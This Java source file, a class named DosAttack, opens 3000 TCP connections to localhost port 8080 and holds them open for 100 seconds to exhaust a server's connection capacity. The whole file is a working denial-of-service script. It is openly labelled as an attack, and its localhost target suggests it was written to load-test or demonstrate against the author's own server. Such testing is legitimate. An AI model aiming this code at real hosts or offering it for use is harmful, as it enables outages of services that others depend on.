package io.staniewicz.dos;

import java.io.IOException;
import java.net.Socket;

public class DosAttack {

    private static final int SOCKETS_NUMBER = 3000;

    public static void main(String[] args) throws InterruptedException {

        Socket[] sockets = new Socket[SOCKETS_NUMBER];

        for (int i = 0; i < SOCKETS_NUMBER; i++) {
            try {
                sockets[i] = new Socket("localhost", 8080);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        Thread.sleep(100_000);
    }
}
